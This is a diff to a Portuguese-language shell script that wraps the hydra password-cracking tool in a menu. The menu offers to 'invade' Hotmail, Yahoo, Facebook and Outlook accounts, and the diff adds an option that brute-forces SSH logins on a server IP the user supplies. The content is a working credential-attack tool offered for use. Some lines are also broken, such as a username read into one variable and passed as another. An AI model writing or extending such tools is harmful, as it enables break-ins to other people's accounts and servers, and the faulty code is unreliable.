@@ -23,6 +23,7 @@ echo "   \033[1;33m[\033[1;31m3]>> \033[1;33mINVADIR HOTMAIL \033[1;36m"
 echo "   \033[1;33m[\033[1;31m4]>> \033[1;33mINVADIR YAHOO \033[1;36m"
 echo "   \033[1;33m[\033[1;31m5]>> \033[1;33mINVADIR FACEBOOK \033[1;36m"
 echo "   \033[1;33m[\033[1;31m6]>> \033[1;33mINVADIR OUTLOOK \033[1;36m"
+echo "   \033[1;33m[\033[1;31m7]>> \033[1;33mINVADIR SSH \033[1;36m"
 #
 #Escolher entre 1,2,3,4 ou 5
 #obrigado por 6usar!
@@ -105,6 +106,18 @@ echo
 echo "\033[1;36mCOMEÇANDO A INVASÃO...!"; sleep 1
 hydra -l $email -P $lista -s 25 smtp.outlook.com https-get
 fi
+if [ "$opcao" = "7" ];then
+echo
+ echo "\033[1;36mINFORME O IP DO SERVIDOR:"; sleep 1
+read -p "[+]=>" ip
+echo
+  echo "\033[1;36mINFORME O DIRETÓRIO DA SUA LISTA DE SENHA"; sleep 1
+read -p "[+]=>" wordlist
+echo
+ echo "\033[1;36mINFORME O USER DO SERVIDOR SSH"; sleep 1
+read -p "[+]=>" usr
+echo
+hydra -l $user -P $wordlist ssh://$ip
 #
 #Fazendo o programa dormir por 4 segundos
 sleep 4
